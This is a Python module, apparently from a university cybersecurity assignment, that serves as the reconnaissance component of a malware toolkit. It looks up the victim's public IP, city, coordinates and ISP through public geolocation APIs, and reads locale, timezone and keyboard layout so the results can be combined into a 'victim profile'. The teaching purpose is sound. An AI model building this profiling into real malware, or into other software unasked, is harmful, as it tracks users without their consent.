"""
Geolocation Module
MITRE ATT&CK: T1016 (System Network Configuration Discovery)
               T1614.001 (System Location Discovery: System Language)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Maps the victim's physical location using public IP geolocation APIs.
Also gathers locale/timezone information for profiling.

Why this matters:
  - Physical location reveals the victim's country, city, ISP
  - Helps attackers determine timezone for scheduling attacks
  - Geofencing: some malware only activates in target countries
  - ISP info reveals corporate vs residential networks
  - Combined with system info, builds a complete victim profile

Implementation:
  - Uses free public APIs (ip-api.com) - no API key needed
  - Falls back to multiple providers for reliability
  - Also gathers system locale and timezone data
"""

import json
import locale
import time
from datetime import datetime

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import ctypes
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False


def get_geolocation():
    """
    Get geographic location based on public IP address.

    Uses ip-api.com (free, no key required, 45 req/min limit).
    Falls back to ipinfo.io if primary fails.

    Returns:
        dict with geolocation data, or error dict

    MITRE ATT&CK: T1016, T1614.001
    """
    if not HAS_REQUESTS:
        return {"error": "requests library not installed"}

    # Primary: ip-api.com (free, no key, detailed)
    try:
        resp = requests.get(
            "http://ip-api.com/json/?fields=status,message,country,countryCode,"
            "region,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
            timeout=10
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "source": "ip-api.com",
                    "public_ip": data.get("query"),
                    "country": data.get("country"),
                    "country_code": data.get("countryCode"),
                    "region": data.get("regionName"),
                    "region_code": data.get("region"),
                    "city": data.get("city"),
                    "zip_code": data.get("zip"),
                    "latitude": data.get("lat"),
                    "longitude": data.get("lon"),
                    "timezone": data.get("timezone"),
                    "isp": data.get("isp"),
                    "organization": data.get("org"),
                    "as_number": data.get("as"),
                    "timestamp": datetime.now().isoformat(),
                }
    except Exception:
        pass

    # Fallback: ipinfo.io (free tier, 50k/month)
    try:
        resp = requests.get("https://ipinfo.io/json", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            loc = data.get("loc", "0,0").split(",")
            return {
                "source": "ipinfo.io",
                "public_ip": data.get("ip"),
                "country": data.get("country"),
                "region": data.get("region"),
                "city": data.get("city"),
                "zip_code": data.get("postal"),
                "latitude": float(loc[0]) if len(loc) > 0 else None,
                "longitude": float(loc[1]) if len(loc) > 1 else None,
                "timezone": data.get("timezone"),
                "isp": data.get("org"),
                "organization": data.get("org"),
                "timestamp": datetime.now().isoformat(),
            }
    except Exception:
        pass

    return {"error": "All geolocation providers failed"}


def get_system_locale():
    """
    Get system locale and language settings.

    Returns:
        dict with locale information
    """
    info = {
        "default_locale": None,
        "preferred_encoding": None,
        "system_language": None,
        "timezone_name": None,
        "utc_offset": None,
        "keyboard_layout": None,
    }

    try:
        info["default_locale"] = locale.getdefaultlocale()[0]
        info["preferred_encoding"] = locale.getpreferredencoding()
    except Exception:
        pass

    # Get timezone info
    try:
        info["timezone_name"] = time.tzname[0]
        info["utc_offset"] = -time.timezone // 3600  # Hours from UTC
    except Exception:
        pass

    # Get keyboard layout (Windows-specific)
    if HAS_CTYPES:
        try:
            # GetKeyboardLayout returns the layout for the foreground thread
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(hwnd, None)
            layout_id = user32.GetKeyboardLayout(thread_id)
            # Low word is the language ID
            lang_id = layout_id & 0xFFFF
            info["keyboard_layout"] = hex(lang_id)

            # Common language IDs
            lang_map = {
                0x0409: "English (US)",
                0x0809: "English (UK)",
                0x0C09: "English (AU)",
                0x0407: "German",
                0x040C: "French",
                0x0410: "Italian",
                0x0411: "Japanese",
                0x0412: "Korean",
                0x0804: "Chinese (Simplified)",
                0x0404: "Chinese (Traditional)",
                0x0419: "Russian",
                0x0416: "Portuguese (Brazil)",
                0x0C0A: "Spanish",
                0x0439: "Hindi",
            }
            info["keyboard_language"] = lang_map.get(lang_id, f"Unknown ({hex(lang_id)})")

        except Exception:
            pass

    # Get system language via Windows API
    if HAS_CTYPES:
        try:
            kernel32 = ctypes.windll.kernel32
            lang = kernel32.GetUserDefaultUILanguage()
            info["system_language_id"] = hex(lang)
        except Exception:
            pass

    return info


def full_geolocation_recon():
    """
    Complete geolocation + locale reconnaissance.

    Returns:
        dict with all location-related data
    """
    geo = get_geolocation()
    loc = get_system_locale()

    return {
        "geolocation": geo,
        "locale": loc,
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "country": geo.get("country", "Unknown"),
            "city": geo.get("city", "Unknown"),
            "isp": geo.get("isp", "Unknown"),
            "public_ip": geo.get("public_ip", "Unknown"),
            "timezone": geo.get("timezone") or loc.get("timezone_name", "Unknown"),
        },
    }


if __name__ == "__main__":
    print("=" * 50)
    print("  Geolocation Module Test")
    print("  MITRE ATT&CK: T1016, T1614.001")
    print("=" * 50)

    print("\n[*] Getting geolocation...")
    geo = get_geolocation()
    if "error" not in geo:
        print(f"[+] Public IP: {geo.get('public_ip')}")
        print(f"[+] Location: {geo.get('city')}, {geo.get('region')}, {geo.get('country')}")
        print(f"[+] Coords: {geo.get('latitude')}, {geo.get('longitude')}")
        print(f"[+] ISP: {geo.get('isp')}")
        print(f"[+] Timezone: {geo.get('timezone')}")
    else:
        print(f"[-] {geo['error']}")

    print("\n[*] Getting system locale...")
    loc = get_system_locale()
    print(f"[+] Locale: {loc.get('default_locale')}")
    print(f"[+] Encoding: {loc.get('preferred_encoding')}")
    print(f"[+] Timezone: {loc.get('timezone_name')} (UTC{loc.get('utc_offset', '?'):+d})")
    if loc.get("keyboard_language"):
        print(f"[+] Keyboard: {loc.get('keyboard_language')}")
